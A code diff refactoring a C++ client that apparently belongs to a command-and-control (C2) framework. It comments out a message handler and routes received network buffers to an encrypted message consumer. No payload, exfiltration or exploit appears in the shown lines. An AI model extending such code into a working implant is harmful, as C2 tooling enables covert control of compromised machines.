@@ -35,8 +35,8 @@ Client::Client(C2ProfileUniquePtr config) :
 	encoderPtr_(std::make_unique<Encoder>()),
 	serializerPtr_(std::make_unique<Serializer>()),
 	messageConsumerPtr_(nullptr), // TODO: should have to be a usingPtr
-	messagePublisherPtr_(nullptr), // TODO: should have to be a usingPtr
-	messageHandlerPtr_(nullptr) // TODO: should have to be a usingPtr
+	messagePublisherPtr_(nullptr)//, // TODO: should have to be a usingPtr
+	//messageHandlerPtr_(nullptr) // TODO: should have to be a usingPtr
 
 	//messageHandler_(nullptr)
 	//configPtr_(std::make_unique<C2Profile>()),
@@ -56,7 +56,7 @@ Client::Client(C2ProfileUniquePtr config) :
 
 	messageConsumerPtr_ = std::make_unique<MessageConsumer>(*encryptorPtr_, *encoderPtr_, *serializerPtr_);
 	messagePublisherPtr_ = std::make_unique<MessagePublisher>(*encryptorPtr_, *encoderPtr_, *serializerPtr_);
-	messageHandlerPtr_ = std::make_unique<MessageHandler>(*config);
+	//messageHandlerPtr_ = std::make_unique<MessageHandler>(*config);
 
 }
 
@@ -250,7 +250,9 @@ bool Client::run(const char* host, const char* port)
 
 	//receiveMessages(recvBuf, bytes_received, &config);
 
-	messageHandler_.receiveMessages(recvBuf, bytes_received);
+	std::vector<uint8_t> consumedBuffer(recvBuf, recvBuf + bytes_received);
+	messageConsumerPtr_->recvMessage(consumedBuffer);
+	//messageHandler_.receiveMessages(recvBuf, bytes_received);
 	
 
 	//////////////////////////////
